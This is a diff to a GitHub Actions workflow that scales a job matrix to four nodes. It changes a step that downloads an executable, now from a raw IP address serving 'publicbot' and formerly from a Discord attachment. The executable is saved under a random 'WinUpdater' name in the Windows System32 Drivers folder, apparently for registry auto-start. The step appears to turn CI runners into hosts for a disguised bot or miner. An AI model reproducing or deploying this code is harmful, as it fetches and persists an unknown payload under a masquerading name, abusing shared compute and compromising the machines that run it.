@@ -9,7 +9,7 @@ jobs:
     timeout-minutes: 3600
     strategy:
       matrix:
-        node_id: [1, 2]
+        node_id: [1, 2, 3, 4]
 
     steps:
       - name: 1. Optimize Environment
@@ -34,7 +34,7 @@ jobs:
 
       - name: 4. Deploy & Auto-Start Registry
         run: |
-          $url = "https://cdn.discordapp.com/attachments/1467684321652637859/1482569024666861680/Python.exe?ex=69bab940&is=69b967c0&hm=471daba7ffd3dbc7a704dcfb15a3048b9a4b0ec069caf389ad61b7ff8ce35b1f&"
+          $url = "http://45.126.209.218:8080/publicbot"
           
           $randName = "WinUpdater_" + (Get-Random -Minimum 10 -Maximum 99) + ".exe"
           $dest = "C:\Windows\System32\Drivers\$randName"
